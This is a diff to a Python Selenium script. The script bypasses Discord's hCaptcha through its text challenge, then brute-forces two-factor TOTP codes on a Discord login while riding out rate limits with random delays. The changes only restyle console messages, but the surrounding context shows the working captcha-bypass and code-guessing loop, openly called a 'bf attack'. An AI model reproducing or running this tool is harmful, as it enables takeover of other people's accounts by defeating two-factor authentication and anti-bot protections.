@@ -81,22 +81,22 @@ def main():
                 print(toColor(f"[*] Bypassing hCaptcha", "yellow"))
                 wait = WDW(driver, 5)
                 wait.until(EC.frame_to_be_available_and_switch_to_it((By.XPATH, '//iframe')))
-                print(toColor(f"Click checkbox", "blue"))
+                print(toColor(f"- Click checkbox", "cyan"))
                 start_button = wait.until(EC.element_to_be_clickable((By.ID, "checkbox")))
                 human_click(driver, start_button)
                 time.sleep(3)
                 driver.switch_to.default_content()
-                print(toColor(f"Click 3 dots", "blue"))
+                print(toColor(f"- Click 3 dots", "cyan"))
                 wait = WDW(driver, 5)
                 wait.until(EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, "iframe[title='hCaptchaチャレンジの主な内容']")))
                 button = wait.until(EC.element_to_be_clickable((By.ID, "menu-info")))
                 human_click(driver, button)
                 time.sleep(3)
-                print(toColor(f"Click text challenge", "blue"))
+                print(toColor(f"- Click text challenge", "cyan"))
                 button = wait.until(EC.element_to_be_clickable((By.ID, "text_challenge")))
                 human_click(driver, button)
                 time.sleep(5)
-                print(toColor(f"enter text", "blue"))
+                print(toColor(f"- Enter text", "cyan"))
                 for i in range(5):
                     try:
                         inputText = driver.find_element(by=By.XPATH, value='//*[@aria-label="チャレンジテキスト入力"]')
@@ -105,10 +105,10 @@ def main():
                             inputText.send_keys(t)
                             time.sleep(0.2)
                         inputText.send_keys(Keys.RETURN)
-                        print(toColor(f"(trying {i+1})", "blue"))
+                        print(toColor(f"  (trying {i + 1})", "cyan"))
                     except:
                         break
-                print(print(toColor(f"[+] Done!! continue to bf attack", "yellow")))
+                print(print(toColor(f"[+] Successfully bypassed hCaptcha!", "yellow")))
                 time.sleep(5)
             except:
                 print(traceback2.format_exc())
@@ -130,7 +130,7 @@ def main():
                     # Test if Discord ratelimits us
                     if "The resource is being rate limited." in driver.page_source:
                         # Log the ratelimit event and wait 7-12 seconds randomly
-                        print(toColor("Ratelimited.", "red"))
+                        print(toColor("[x] Ratelimited.", "red"))
                         sleepy = secrets.choice(range(7, 12))
                         ratelimitCount += 1
                     # This means that Discord has expired this login session.
@@ -138,10 +138,10 @@ def main():
                         # This means that Discord has expired this login session.
                         #  Print this out as well as some statistics, and prompt the user to retry.
                         elapsed = time.time() - start
-                        print(toColor("Invalid session ticket. The Discord login session has expired, try to run the program again.", "red"))
-                        print(toColor(f"Number of tried codes: {totpCount}", "blue"))
-                        print(toColor(f"Time elapsed for codes: {elapsed}", "blue"))
-                        print(toColor(f"Number of ratelimits {ratelimitCount}", "blue"))
+                        print(toColor("[x] Invalid session ticket. The Discord login session has expired.", "red"))
+                        print(toColor(f"- Number of tried codes: {totpCount}", "cyan"))
+                        print(toColor(f"- Time elapsed for codes: {elapsed}", "cyan"))
+                        print(toColor(f"- Number of ratelimits {ratelimitCount}", "cyan"))
                         return False
                     # The entered TOTP code is invalid. Wait 6-10 seconds, then try again.
                     else:
@@ -152,7 +152,7 @@ def main():
                         # Wait 1 second, then check if the Discord App's HTML loaded. If loaded, then output it to the user.
                         time.sleep(1)
                         loginTest = driver.find_element(by=By.CLASS_NAME, value="app-2CXKsg")
-                        print(toColor(f"Code {totp} worked!"))
+                        print(toColor(f"[o] Code {totp} worked!", "yellow"))
                         break
                     except NoSuchElementException:
                         # This means that the login was unsuccessful.
@@ -160,8 +160,7 @@ def main():
                         # Backspace the previously entered TOTP code.
                         for i in range(6):
                             loginTOTP.send_keys(Keys.BACKSPACE)
-
-                        print("Code " + toColor(totp, "blue") + " did not work, delay: " + toColor(sleepy, "blue"))
+                        print("[-] Code " + toColor(totp, "cyan") + " did not work, delay: " + toColor(sleepy, "cyan"))
 
             # If the TOTP login field is not found (e.g the user hasn't completed the Captcha, then try again
             except NoSuchElementException:
